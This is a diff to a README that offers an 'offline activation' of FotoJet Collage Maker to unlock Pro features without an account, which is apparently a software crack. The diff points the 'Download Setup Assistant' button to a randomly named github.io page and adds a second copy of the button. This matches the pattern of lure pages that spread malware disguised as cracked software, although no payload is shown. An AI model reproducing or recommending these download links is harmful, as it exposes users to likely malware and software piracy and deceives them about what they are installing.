@@ -1,6 +1,6 @@
 # FotoJet Collage Maker — Offline Activation Guide
 
-[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️%20Download%20Setup%20Assistant-%20Click%20to%20Start%20-%233b82f6?style=for-the-badge)](https://fotojet-collage-maker-download.github.io/.github)
+[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️%20Download%20Setup%20Assistant-%20Click%20to%20Start%20-%233b82f6?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/fotoj)
 
 > A complete offline setup guide to install and unlock FotoJet Collage Maker with all Pro features. No internet or account login required.
 
@@ -36,6 +36,8 @@
 
 ![FotoJet Photo Filters](https://th.bing.com/th/id/OIP.KX7eDH9AbY2DJG4mewsSaAHaDm?o=7rm=3&rs=1&pid=ImgDetMain&cb=idpwebpc2)  
 *Advanced filters and design tools in the Pro version*
+
+[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️%20Download%20Setup%20Assistant-%20Click%20to%20Start%20-%233b82f6?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/fotoj)
 
 ---
 
